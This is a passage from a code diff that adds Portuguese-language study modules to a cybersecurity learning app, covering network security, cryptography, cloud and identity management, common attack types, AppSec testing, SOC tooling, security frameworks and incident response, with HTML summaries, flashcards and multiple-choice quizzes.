+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-emerald-400 font-semibold mb-2">2.3 Conformidade (ISO/IEC 27001, 27002, 27005)</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1 list-disc list-inside">
+                <li><strong>ISO/IEC 27001:</strong> Requisitos para estabelecer, implementar, manter e melhorar um <strong>SGSI</strong> (certificável).</li>
+                <li><strong>ISO/IEC 27002:</strong> Código de prática com catálogo de controles de segurança (organizacionais, pessoas, físicos e tecnológicos).</li>
+                <li><strong>ISO/IEC 27005:</strong> Diretrizes específicas para Gestão de Riscos de Segurança da Informação.</li>
+              </ul>
+            </div>
+          </div>
+        `,
+        labType: 'risk-matrix',
+        flashcards: [
+          { q: 'Qual a diferença entre Ameaça e Vulnerabilidade?', a: 'Vulnerabilidade é uma fraqueza ou falha em um ativo/controle (ex: software desatualizado). Ameaça é o agente ou evento externo/interno capaz de explorar essa fraqueza (ex: hacker, ransomware, incêndio).' },
+          { q: 'Qual norma da família ISO 27000 é auditável para certificação de um Sistema de Gestão de Segurança da Informação (SGSI)?', a: 'ISO/IEC 27001. A ISO/IEC 27002 funciona como guia de boas práticas de controles.' }
+        ],
+        quiz: [
+          {
+            question: 'Quando uma empresa contrata um seguro cibernético ou terceiriza o processamento de cartões para um gateway certificado PCI-DSS, qual estratégia de tratamento de risco ela está adotando?',
+            options: ['Evitar o risco', 'Transferir / Compartilhar o risco', 'Eliminar a vulnerabilidade', 'Ignorar o risco'],
+            answer: 1,
+            explanation: 'Seguros e terceirização transferem ou compartilham o impacto financeiro/operacional de um incidente com outra parte.'
+          }
+        ]
+      },
+      {
+        id: 'sec-3',
+        track: 'SEC',
+        number: '3',
+        title: 'Segurança de Rede (Firewalls, IDS/IPS, VPNs e Segmentação)',
+        shortDesc: 'Arquitetura defensiva de perímetro, DMZ, VLANs, inspeção de pacotes e túneis criptografados.',
+        tags: ['Firewall', 'IDS', 'IPS', 'VPN', 'DMZ', 'VLAN', 'Zero Trust'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A segurança de rede protege o tráfego de dados e impede a movimentação lateral de invasores através do controle de perímetro, segmentação interna e criptografia de canais.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-cyan-400 font-semibold mb-2">Firewalls & IDS/IPS</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Firewall Stateful:</strong> Monitora o estado das conexões TCP/UDP e aplica regras (IP, porta, protocolo).</li>
+                <li><strong>NGFW (Next-Gen Firewall):</strong> Inspeção profunda de pacotes (DPI - Camada 7), controle de aplicações e integração com inteligência de ameaças.</li>
+                <li><strong>IDS (Detecção):</strong> Passivo; analisa cópia do tráfego e gera <em>alertas</em> ao detectar assinaturas/anomalias.</li>
+                <li><strong>IPS (Prevenção):</strong> Ativo (<em>inline</em>); detecta e <strong>bloqueia/descarta</strong> o pacote malicioso em tempo real.</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-indigo-400 font-semibold mb-2">VPNs e Segmentação de Rede</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>VPN (Virtual Private Network):</strong> Cria um túnel criptografado sobre uma rede pública (Internet). Principais protocolos: <strong>IPsec</strong> (Site-to-Site / Camada 3), <strong>TLS/SSL</strong> (Client-to-Site) e <strong>WireGuard</strong>.</li>
+                <li><strong>DMZ (Zona Desmilitarizada):</strong> Sub-rede intermediária que hospeda servidores expostos à Internet (Web, E-mail), isolando-os da rede interna (LAN).</li>
+                <li><strong>VLANs & Microssegmentação:</strong> Separam logicamente departamentos (RH, Financeiro, Servidores) contendo o raio de explosão de ataques.</li>
+              </ul>
+            </div>
+          </div>
+        `,
+        labType: 'firewall-rules',
+        flashcards: [
+          { q: 'Qual a diferença operacional entre IDS e IPS na arquitetura de rede?', a: 'O IDS atua fora de linha (monitoramento passivo) apenas alertando sobre ataques. O IPS atua em linha (inline) e bloqueia ativamente o tráfego malicioso.' },
+          { q: 'Para que serve uma DMZ (Zona Desmilitarizada)?', a: 'Isolar servidores que precisam receber conexões externas da Internet (como servidores Web) da rede interna corporativa, aumentando a proteção caso o servidor público seja comprometido.' }
+        ],
+        quiz: [
+          {
+            question: 'Um servidor web público da empresa precisa ser acessado por clientes na Internet, mas não deve ter acesso direto irrestrito ao banco de dados interno. Onde esse servidor web deve ser posicionado?',
+            options: ['Diretamente na LAN interna', 'Na DMZ (Zona Desmilitarizada)', 'Na rede Wi-Fi de visitantes', 'Dentro do controlador de domínio Active Directory'],
+            answer: 1,
+            explanation: 'A DMZ atua como zona tampão entre a rede externa não confiável (Internet) e a rede interna confiável (LAN).'
+          }
+        ]
+      },
+      {
+        id: 'sec-4',
+        track: 'SEC',
+        number: '4',
+        title: 'Criptografia (Simétrica, Assimétrica e Hashing)',
+        shortDesc: 'Técnicas criptográficas, algoritmos modernos (AES, RSA, ECC, SHA-256) e gestão de chaves.',
+        tags: ['Criptografia', 'AES', 'RSA', 'ECC', 'SHA-256', 'Hash', 'Chave Pública'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A <strong>Criptografia</strong> transforma dados legíveis (texto claro) em formatos ininteligíveis (texto cifrado) por meio de algoritmos matemáticos e chaves, assegurando confidencialidade, integridade e autenticidade.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30">
+              <h4 class="text-cyan-400 font-bold mb-1">Criptografia Simétrica</h4>
+              <p class="text-xs text-slate-300 mb-2">Usa a <strong>mesma chave secreta</strong> para cifrar e decifrar. Extremamente rápida, ideal para grandes volumes de dados.</p>
+              <p class="text-[11px] font-mono text-cyan-300">Algoritmos: AES-128/256, ChaCha20, 3DES (legado).</p>
+              <p class="text-[11px] text-slate-400 mt-1">Desafio: Distribuição segura da chave.</p>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-indigo-500/30">
+              <h4 class="text-indigo-400 font-bold mb-1">Criptografia Assimétrica</h4>
+              <p class="text-xs text-slate-300 mb-2">Usa um <strong>par de chaves</strong> matematicamente ligado: <strong>Chave Pública</strong> e <strong>Chave Privada</strong>. Mais lenta (usada para troca de chaves e assinatura).</p>
+              <p class="text-[11px] font-mono text-indigo-300">Algoritmos: RSA, ECC (Curvas Elípticas), Diffie-Hellman.</p>
+              <p class="text-[11px] text-slate-400 mt-1">Regra: Cifra com Pública → Decifra com Privada.</p>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-emerald-500/30">
+              <h4 class="text-emerald-400 font-bold mb-1">Funções Hash (Mão Única)</h4>
+              <p class="text-xs text-slate-300 mb-2">Gera um resumo digital de tamanho fixo. <strong>Irreversível</strong> (não descriptografa). Qualquer alteração de 1 bit muda todo o hash (efeito avalanche).</p>
+              <p class="text-[11px] font-mono text-emerald-300">Algoritmos: SHA-256, SHA-3, Argon2/bcrypt (senhas).</p>
+              <p class="text-[11px] text-slate-400 mt-1">Evitar MD5 e SHA-1 (quebrados por colisão).</p>
+            </div>
+          </div>
+          <p class="text-xs sm:text-sm text-slate-300 bg-slate-900/80 p-3.5 rounded-xl border border-slate-800">
+            🔐 <strong>Criptografia Híbrida (ex: TLS/HTTPS e PGP):</strong> Combina o melhor dos dois mundos! Usa criptografia <em>assimétrica</em> no início da conexão para negociar com segurança uma chave de sessão temporária e, em seguida, usa criptografia <em>simétrica</em> (AES) para transmitir todos os dados em alta velocidade.
+          </p>
+        `,
+        labType: 'crypto-hash',
+        flashcards: [
+          { q: 'Para enviar uma mensagem confidencial usando criptografia assimétrica para Alice, qual chave você deve usar para cifrar?', a: 'Você deve cifrar usando a Chave Pública da Alice. Assim, apenas a Alice conseguirá decifrar usando sua própria Chave Privada.' },
+          { q: 'Por que funções Hash como SHA-256 não são consideradas criptografia reversível?', a: 'Porque são funções matemáticas de mão única (one-way): não existe uma chave para reverter o digest ao texto original. Servem para validar integridade e armazenar senhas (com Salt).' }
+        ],
+        quiz: [
+          {
+            question: 'Qual algoritmo abaixo é um padrão moderno de criptografia SIMÉTRICA amplamente adotado para proteger dados em repouso e conexões TLS?',
+            options: ['RSA-2048', 'SHA-256', 'AES-256', 'MD5'],
+            answer: 2,
+            explanation: 'O AES (Advanced Encryption Standard) com chaves de 128, 192 ou 256 bits é o principal padrão mundial de criptografia simétrica.'
+          }
+        ]
+      },
+      {
+        id: 'sec-5',
+        track: 'SEC',
+        number: '5',
+        title: 'Segurança em Nuvem (Cloud Security)',
+        shortDesc: 'Modelo de Responsabilidade Compartilhada, IAM Cloud, CSPM, CASB e proteção de buckets/APIs.',
+        tags: ['Cloud Security', 'Responsabilidade Compartilhada', 'CSPM', 'CASB', 'S3 Bucket'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            Migrar para a nuvem não transfere toda a responsabilidade de segurança ao provedor (AWS, Azure, GCP). A segurança opera sob o <strong>Modelo de Responsabilidade Compartilhada</strong>.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30">
+              <h4 class="text-cyan-400 font-semibold mb-2">Segurança DA Nuvem (Provedor)</h4>
+              <p class="text-xs sm:text-sm text-slate-300">O provedor protege a infraestrutura global que executa todos os serviços: segurança física dos datacenters, hardware, rede física, hipervisores e isolamento de regiões.</p>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-amber-500/30">
+              <h4 class="text-amber-400 font-semibold mb-2">Segurança NA Nuvem (Cliente)</h4>
+              <p class="text-xs sm:text-sm text-slate-300">O cliente é sempre responsável pelos <strong>seus dados</strong>, gestão de identidades/permissões (IAM), criptografia client-side, regras de firewall/Security Groups e configuração correta dos serviços (ex: evitar buckets S3 públicos).</p>
+            </div>
+          </div>
+          <div class="p-4 rounded-xl bg-slate-900 border border-slate-800 text-xs sm:text-sm text-slate-300 space-y-1.5">
+            <p><strong class="text-emerald-400">CSPM (Cloud Security Posture Management):</strong> Ferramentas que auditam continuamente configurações incorretas na nuvem (misconfigurations, portas abertas, buckets expostos).</p>
+            <p><strong class="text-indigo-400">CASB (Cloud Access Security Broker):</strong> Ponto de aplicação de políticas entre usuários corporativos e serviços SaaS, controlando Shadow IT e DLP.</p>
+          </div>
+        `,
+        labType: 'cloud-shared',
+        flashcards: [
+          { q: 'No Modelo de Responsabilidade Compartilhada em nuvem, quem é responsável pelos dados do cliente e configuração de permissões IAM?', a: 'Sempre o Cliente, independentemente do modelo ser IaaS, PaaS ou SaaS.' },
+          { q: 'Qual é uma das principais causas de vazamento de dados em ambientes de nuvem?', a: 'Erros de configuração (misconfiguration), como deixar buckets de armazenamento (ex: AWS S3) ou bancos de dados abertos publicamente sem autenticação.' }
+        ],
+        quiz: [
+          {
+            question: 'Em um ambiente IaaS (Infraestrutura como Serviço), qual responsabilidade pertence exclusivamente ao PROVEDOR de nuvem?',
+            options: ['Aplicar patches de segurança no sistema operacional convidado (Guest OS)', 'Configurar regras de Security Group e firewall da VM', 'Garantir a segurança física do datacenter e do hipervisor', 'Criptografar os arquivos armazenados pelo cliente'],
+            answer: 2,
+            explanation: 'A segurança física das instalações, hardware e camada de virtualização (hipervisor) é sempre responsabilidade do provedor.'
+          }
+        ]
+      },
+      {
+        id: 'sec-6',
+        track: 'SEC',
+        number: '6',
+        title: 'Gestão de Identidades e Acesso (AuthN, AuthZ, SSO, SAML, OAuth2, OIDC)',
+        shortDesc: 'Autenticação vs Autorização, MFA, Single Sign-On e protocolos modernos de federação.',
+        tags: ['IAM', 'SSO', 'SAML', 'OAuth2', 'OpenID Connect', 'MFA', 'JWT'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A identidade tornou-se o novo perímetro de segurança. Distinguir <strong>Autenticação</strong> de <strong>Autorização</strong> e dominar os padrões federados é essencial para arquiteturas modernas.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-cyan-400 font-semibold mb-2">Autenticação (AuthN) vs Autorização (AuthZ)</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Autenticação (Quem é você?):</strong> Verifica a identidade. <strong>MFA</strong> combina pelo menos 2 fatores distintos: <em>Algo que você sabe</em> (senha), <em>Algo que você tem</em> (token/app autenticador) e <em>Algo que você é</em> (biometria).</li>
+                <li><strong>Autorização (O que você pode fazer?):</strong> Define permissões após autenticado (ex: RBAC - Controle Baseado em Papéis, Princípio do Menor Privilégio).</li>
+                <li><strong>SSO (Single Sign-On):</strong> Autenticar-se uma única vez em um Provedor de Identidade (IdP) para acessar múltiplos sistemas sem redigitar senhas.</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-indigo-500/30">
+              <h4 class="text-indigo-400 font-semibold mb-2">SAML vs OAuth 2.0 vs OpenID Connect (OIDC)</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-2 list-disc list-inside">
+                <li><strong>SAML 2.0:</strong> Baseado em <strong>XML</strong>. Muito usado em SSO corporativo (Enterprise) entre IdP (Entra ID, Okta) e Service Providers.</li>
+                <li><strong>OAuth 2.0:</strong> Framework de <strong>AUTORIZAÇÃO delegada</strong> (baseado em JSON/HTTP). Permite que um app acesse recursos em seu nome via <em>Access Tokens</em> sem receber sua senha.</li>
+                <li><strong>OpenID Connect (OIDC):</strong> Camada de <strong>AUTENTICAÇÃO</strong> construída sobre o OAuth 2.0. Emite um <strong>ID Token (JWT)</strong> com os dados do usuário autenticado (ideal para apps mobile e SPAs).</li>
+              </ul>
+            </div>
+          </div>
+        `,
+        labType: 'auth-flow',
+        flashcards: [
+          { q: 'Qual a diferença principal entre OAuth 2.0 e OpenID Connect (OIDC)?', a: 'OAuth 2.0 é um protocolo de AUTORIZAÇÃO delegada (concede acesso a recursos via Access Token). O OpenID Connect é uma camada de AUTENTICAÇÃO sobre o OAuth 2.0 que entrega um ID Token (JWT) provando quem é o usuário.' },
+          { q: 'Quais são os 3 fatores clássicos de autenticação (MFA)?', a: '1) Conhecimento (algo que você sabe, como senha/PIN); 2) Posse (algo que você tem, como celular/token); 3) Inerência (algo que você é, como biometria facial ou digital).' }
+        ],
+        quiz: [
+          {
+            question: 'Um protocolo de federação de identidade corporativa amplamente utilizado para Single Sign-On (SSO) que troca asserções assinadas em formato XML entre o IdP e o SP é o:',
+            options: ['OAuth 2.0', 'SAML 2.0', 'RADIUS', 'SNMPv3'],
+            answer: 1,
+            explanation: 'O SAML (Security Assertion Markup Language) utiliza mensagens XML assinadas digitalmente para realizar autenticação federada/SSO.'
+          }
+        ]
+      },
+      {
+        id: 'sec-7',
+        track: 'SEC',
+        number: '7',
+        title: 'Principais Tipos de Ataques e Vulnerabilidades',
+        shortDesc: 'Engenharia Social, Phishing, Ransomware, DDoS, SQL Injection, XSS, CSRF, MitM e Zero-Day.',
+        tags: ['Phishing', 'Ransomware', 'DDoS', 'SQL Injection', 'XSS', 'CSRF', 'Zero-Day'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            Conhecer a anatomia dos ataques cibernéticos permite estruturar defesas eficazes tanto na camada humana quanto na infraestrutura e no código das aplicações.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-rose-500/30">
+              <h4 class="text-rose-400 font-semibold mb-2">Engenharia Social & Infraestrutura</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Phishing / Spear Phishing:</strong> Fraude via e-mail/mensagem falsa para roubar credenciais. <em>Spear Phishing</em> é direcionado a um alvo específico; <em>Whaling</em> mira executivos.</li>
+                <li><strong>DDoS (Negação de Serviço Distribuída):</strong> Rede de máquinas zumbis (<em>Botnet</em>) sobrecarrega um servidor com tráfego massivo para derrubá-lo.</li>
+                <li><strong>Man-in-the-Middle (MitM):</strong> Atacante intercepta e pode alterar comunicações entre duas partes (ex: Wi-Fi público falso).</li>
+                <li><strong>Zero-Day (Dia Zero):</strong> Vulnerabilidade recém-descoberta para a qual o fabricante ainda não lançou correção (patch).</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-amber-500/30">
+              <h4 class="text-amber-400 font-semibold mb-2">Ataques em Aplicações Web</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>SQL Injection (SQLi):</strong> Inserção de comandos SQL maliciosos em campos de entrada não sanitizados para ler ou alterar o banco de dados.</li>
+                <li><strong>Cross-Site Scripting (XSS):</strong> Injeção de scripts maliciosos (JavaScript) em páginas confiáveis para executar no navegador da vítima e roubar cookies/sessões.</li>
+                <li><strong>CSRF (Cross-Site Request Forgery):</strong> Induz o navegador de um usuário já autenticado a enviar requisições indesejadas a uma aplicação web.</li>
+                <li><strong>Brute Force & Credential Stuffing:</strong> Tentativa sistemática de senhas ou reuso de credenciais vazadas em outros sites.</li>
+              </ul>
+            </div>
+          </div>
+        `,
+        labType: 'attack-defense',
+        flashcards: [
+          { q: 'Qual a diferença entre SQL Injection e Cross-Site Scripting (XSS)?', a: 'SQL Injection ataca o servidor de Banco de Dados injetando comandos SQL. XSS ataca o navegador do usuário final injetando código JavaScript malicioso.' },
+          { q: 'O que caracteriza uma vulnerabilidade Zero-Day?', a: 'É uma falha de segurança desconhecida pelo fornecedor do software, portanto ainda sem patch de correção disponível no momento em que começa a ser explorada.' }
+        ],
+        quiz: [
+          {
+            question: 'Um atacante envia um link malicioso que explora uma falha em um site confiável para executar código JavaScript diretamente no navegador da vítima e capturar seu token de sessão. Esse ataque é:',
+            options: ['DDoS', 'Cross-Site Scripting (XSS)', 'ARP Spoofing', 'Ransomware'],
+            answer: 1,
+            explanation: 'O XSS (Cross-Site Scripting) consiste na execução de scripts maliciosos no contexto do navegador da vítima.'
+          }
+        ]
+      },
+      {
+        id: 'sec-8',
+        track: 'SEC',
+        number: '8',
+        title: 'Controles e Testes de Segurança para Aplicações Web e Web Services',
+        shortDesc: 'OWASP Top 10, SAST, DAST, Pentest (Black/White/Gray Box), WAF e segurança de APIs.',
+        tags: ['OWASP Top 10', 'SAST', 'DAST', 'Pentest', 'WAF', 'APIs REST'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A segurança no ciclo de desenvolvimento (AppSec) combina boas práticas do <strong>OWASP Top 10</strong>, testes automatizados e controles em tempo de execução.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30">
+              <h4 class="text-cyan-400 font-semibold mb-2">SAST vs DAST vs IAST</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>SAST (Static Application Security Testing):</strong> Análise estática (<em>Caixa Branca</em>) feita diretamente no <strong>código-fonte</strong> sem executar a aplicação.</li>
+                <li><strong>DAST (Dynamic Application Security Testing):</strong> Análise dinâmica (<em>Caixa Preta</em>) feita com a aplicação <strong>em execução</strong>, simulando ataques externos via HTTP.</li>
+                <li><strong>SCA (Software Composition Analysis):</strong> Analisa bibliotecas de terceiros e dependências open-source em busca de CVEs conhecidas.</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-indigo-500/30">
+              <h4 class="text-indigo-400 font-semibold mb-2">Controles Web & APIs (REST/SOAP)</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>WAF (Web Application Firewall):</strong> Filtra tráfego HTTP/HTTPS na Camada 7, bloqueando padrões de SQLi, XSS e bots maliciosos.</li>
+                <li><strong>Prepared Statements (Queries Parametrizadas):</strong> Principal defesa contra SQL Injection no código.</li>
+                <li><strong>Segurança de APIs:</strong> Uso de TLS obrigatório, tokens JWT assinados, <em>Rate Limiting</em> (evitar abuso/DoS) e validação estrita de esquemas (JSON Schema) e autorização por objeto (evitar BOLA/IDOR).</li>
+              </ul>
+            </div>
+          </div>
+          <div class="p-3.5 rounded-xl bg-slate-900 border border-slate-800 text-xs sm:text-sm text-slate-300">
+            <strong class="text-emerald-400">Tipos de Pentest (Teste de Intrusão):</strong> <em>Black Box</em> (testador não possui conhecimento prévio da arquitetura), <em>White Box</em> (acesso total a código, diagramas e credenciais) e <em>Gray Box</em> (conhecimento parcial, simulando um usuário interno ou parceiro).
+          </div>
+        `,
+        labType: 'sqli-defense',
+        flashcards: [
+          { q: 'Qual a diferença entre SAST e DAST?', a: 'SAST analisa o código-fonte estaticamente sem rodar o programa (White Box). DAST testa a aplicação já em execução pelo lado de fora (Black Box).' },
+          { q: 'Qual a forma mais eficaz de prevenir SQL Injection no desenvolvimento de software?', a: 'Utilizar Consultas Parametrizadas (Prepared Statements / Bind Variables), separando a estrutura do comando SQL dos dados fornecidos pelo usuário.' }
+        ],
+        quiz: [
+          {
+            question: 'Uma ferramenta integrada à esteira de CI/CD que analisa o código-fonte em busca de falhas de segurança antes mesmo da compilação ou execução da aplicação é classificada como:',
+            options: ['DAST', 'WAF', 'SAST', 'SIEM'],
+            answer: 2,
+            explanation: 'SAST (Static Application Security Testing) inspeciona o código-fonte estaticamente nas fases iniciais do desenvolvimento.'
+          }
+        ]
+      },
+      {
+        id: 'sec-9',
+        track: 'SEC',
+        number: '9',
+        title: 'Soluções para Segurança da Informação (SOC & Stack Defensiva)',
+        shortDesc: 'Firewall, IDS, IPS, SIEM, Proxy, IAM, PAM, Antivírus/EDR e Antispam.',
+        tags: ['SIEM', 'PAM', 'IAM', 'Proxy', 'WAF', 'EDR', 'Antispam'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            Um Centro de Operações de Segurança (<strong>SOC</strong>) integra múltiplas soluções especializadas para visibilidade, prevenção e controle de acessos privilegiados.
+          </p>
+          <div class="overflow-x-auto rounded-xl border border-slate-800">
+            <table class="w-full text-left text-xs sm:text-sm">
+              <thead class="bg-slate-900 text-slate-300 border-b border-slate-800">
+                <tr>
+                  <th class="p-3">Solução</th>
+                  <th class="p-3">Função Principal</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-800 text-slate-300">
+                <tr><td class="p-3 font-bold text-cyan-400">Firewall / IPS / IDS</td><td class="p-3">Controle de tráfego de rede por políticas (Firewall), detecção passiva (IDS) e bloqueio ativo de intrusões (IPS).</td></tr>
+                <tr><td class="p-3 font-bold text-indigo-400">SIEM</td><td class="p-3"><em>Security Information and Event Management</em>: coleta, normaliza e correlaciona logs de toda a infraestrutura em tempo real para detectar incidentes.</td></tr>
+                <tr><td class="p-3 font-bold text-emerald-400">Proxy (Forward / Reverse)</td><td class="p-3">Intermediário de conexões. <em>Forward Proxy</em> filtra acesso web dos usuários internos (URL filtering, cache); <em>Reverse Proxy</em> protege e balanceia servidores internos.</td></tr>
+                <tr><td class="p-3 font-bold text-amber-400">IAM</td><td class="p-3"><em>Identity and Access Management</em>: gerencia ciclo de vida de usuários comuns, provisionamento e políticas de acesso.</td></tr>
+                <tr><td class="p-3 font-bold text-rose-400">PAM</td><td class="p-3"><em>Privileged Access Management</em>: cofre de senhas, rotação automática de credenciais administrativas (root/Administrator) e gravação de sessões privilegiadas.</td></tr>
+                <tr><td class="p-3 font-bold text-slate-200">Antivírus / EDR & Antispam</td><td class="p-3">Proteção de endpoints contra malwares/ransomware (EDR oferece resposta avançada) e filtragem de e-mails maliciosos/phishing (SPF, DKIM, DMARC).</td></tr>
+              </tbody>
+            </table>
+          </div>
+        `,
+        labType: 'soc-matcher',
+        flashcards: [
+          { q: 'Para que serve uma solução SIEM em um SOC?', a: 'Coletar, armazenar e correlacionar logs e eventos de segurança de diversas fontes (firewalls, servidores, endpoints) para identificar padrões de ataque em tempo real.' },
+          { q: 'Qual a diferença entre IAM e PAM?', a: 'IAM gerencia identidades e acessos de todos os usuários da organização. PAM é focado especificamente no controle, cofre de senhas e auditoria de contas de alto privilégio (administradores, root, contas de serviço).' }
+        ],
+        quiz: [
+          {
+            question: 'Qual solução é projetada especificamente para armazenar credenciais de administradores (root/Domain Admin) em um cofre seguro, realizar rotação automática de senhas e gravar as sessões executadas?',
+            options: ['Antispam', 'PAM (Privileged Access Management)', 'Proxy Reverso', 'IDS'],
+            answer: 1,
+            explanation: 'O PAM (Gerenciamento de Acesso Privilegiado) protege e audita contas com privilégios elevados.'
+          }
+        ]
+      },
+      {
+        id: 'sec-10',
+        track: 'SEC',
+        number: '10',
+        title: 'Frameworks de Segurança (MITRE ATT&CK, CIS Controls e NIST CSF)',
+        shortDesc: 'Táticas e Técnicas de adversários (MITRE), controles priorizados (CIS) e funções NIST CSF.',
+        tags: ['MITRE ATT&CK', 'CIS Controls', 'NIST CSF', 'Frameworks', 'TTPs'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            Frameworks estruturam a estratégia cibernética com linguagens padronizadas e controles comprovados pela indústria.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-rose-500/30">
+              <h4 class="text-rose-400 font-bold mb-1">MITRE ATT&CK</h4>
+              <p class="text-xs sm:text-sm text-slate-300">Base de conhecimento global que cataloga o comportamento real dos atacantes em <strong>Táticas</strong> (o "porquê", ex: Acesso Inicial, Escalação de Privilégio, Exfiltração) e <strong>Técnicas</strong> (o "como", ex: Phishing, Mimikatz).</p>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30">
+              <h4 class="text-cyan-400 font-bold mb-1">CIS Controls (v8)</h4>
+              <p class="text-xs sm:text-sm text-slate-300">Conjunto prescritivo e priorizado de <strong>18 controles críticos</strong> de defesa cibernética (Inventário de Ativos, Gestão de Vulnerabilidades, Defesa contra Malware), divididos em Grupos de Implementação (IG1, IG2, IG3).</p>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-indigo-500/30">
+              <h4 class="text-indigo-400 font-bold mb-1">NIST CSF (2.0)</h4>
+              <p class="text-xs sm:text-sm text-slate-300">Framework flexível de gestão de riscos organizado em funções contínuas: <strong>Governar (Govern), Identificar (Identify), Proteger (Protect), Detectar (Detect), Responder (Respond) e Recuperar (Recover)</strong>.</p>
+            </div>
+          </div>
+        `,
+        labType: 'nist-explorer',
+        flashcards: [
+          { q: 'Quais são as funções principais do NIST Cybersecurity Framework (CSF)?', a: 'Governar (Govern - adicionado na v2.0), Identificar (Identify), Proteger (Protect), Detectar (Detect), Responder (Respond) e Recuperar (Recover).' },
+          { q: 'O que o framework MITRE ATT&CK cataloga?', a: 'Táticas, Técnicas e Procedimentos (TTPs) observados em ataques cibernéticos reais, ajudando equipes de defesa (Blue Team) a mapear lacunas de detecção.' }
+        ],
+        quiz: [
+          {
+            question: 'No NIST Cybersecurity Framework, em qual função se enquadram atividades como inventário de ativos, avaliação de riscos e mapeamento de fluxos de dados?',
+            options: ['Detectar (Detect)', 'Identificar (Identify)', 'Recuperar (Recover)', 'Responder (Respond)'],
+            answer: 1,
+            explanation: 'A função Identificar (Identify) compreende o entendimento organizacional para gerenciar riscos cibernéticos aos sistemas, pessoas, ativos e dados.'
+          }
+        ]
+      },
+      {
+        id: 'sec-11',
+        track: 'SEC',
+        number: '11',
+        title: 'Tratamento de Incidentes Cibernéticos',
+        shortDesc: 'Ciclo de vida de resposta a incidentes (NIST SP 800-61), CSIRT e cadeia de custódia.',
+        tags: ['CSIRT', 'Resposta a Incidentes', 'Contenção', 'Erradicação', 'NIST 800-61'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            O <strong>Tratamento de Incidentes</strong> (conduzido por equipes <strong>CSIRT / CERT</strong>) estabelece procedimentos estruturados para minimizar danos, restaurar operações e preservar evidências forenses.
+          </p>
+          <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30 mb-4">
+            <h4 class="text-cyan-400 font-semibold mb-3 text-sm">Fases do Ciclo de Resposta a Incidentes (NIST SP 800-61)</h4>
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 text-xs">
+              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                <span class="font-bold text-cyan-300 block mb-1">1. Preparação</span>
+                <p class="text-slate-400">Criação de playbooks, treinamento da equipe CSIRT, configuração de logs e ferramentas forenses antes do incidente ocorrer.</p>
+              </div>
+              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                <span class="font-bold text-indigo-300 block mb-1">2. Detecção e Análise</span>
+                <p class="text-slate-400">Triagem de alertas (SIEM/EDR), confirmação do incidente, escopo, severidade e preservação da cadeia de custódia.</p>
+              </div>
+              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                <span class="font-bold text-amber-300 block mb-1">3. Contenção, Erradicação e Recuperação</span>
+                <p class="text-slate-400"><strong>Contenção:</strong> isolar host da rede para estancar o ataque. <strong>Erradicação:</strong> remover malware/causa raiz. <strong>Recuperação:</strong> restaurar sistemas limpos e monitorar.</p>
+              </div>
+              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                <span class="font-bold text-emerald-300 block mb-1">4. Atividade Pós-Incidente</span>
